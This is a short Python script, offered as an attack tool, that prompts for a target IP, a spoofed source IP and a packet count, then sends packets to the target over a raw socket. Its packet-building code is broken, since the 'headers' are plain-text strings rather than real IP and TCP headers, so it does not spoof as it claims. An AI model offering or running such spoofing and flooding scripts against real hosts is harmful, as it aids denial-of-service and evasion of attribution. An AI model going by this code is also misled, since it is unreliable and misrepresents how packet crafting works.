import socket
import random

def spoof_ip(target_ip, spoofed_ip, num_packets):
    # Create a raw socket
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

    # Set the IP headers manually
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # Generate random source port
    source_port = random.randint(1024, 65535)

    # Craft the IP packet
    ip_header = f"Source IP: {spoofed_ip}, Destination IP: {target_ip}"
    tcp_packet = f"Source Port: {source_port}, Destination Port: 80"

    # Send the packets
    for _ in range(num_packets):
        packet = ip_header + tcp_packet
        s.sendto(packet.encode(), (target_ip, 0))

if __name__ == "__main__":
    target_ip = input("Enter the target IP address: ")
    spoofed_ip = input("Enter the spoofed IP address: ")
    num_packets = int(input("Enter the number of packets to send: "))

    spoof_ip(target_ip, spoofed_ip, num_packets)
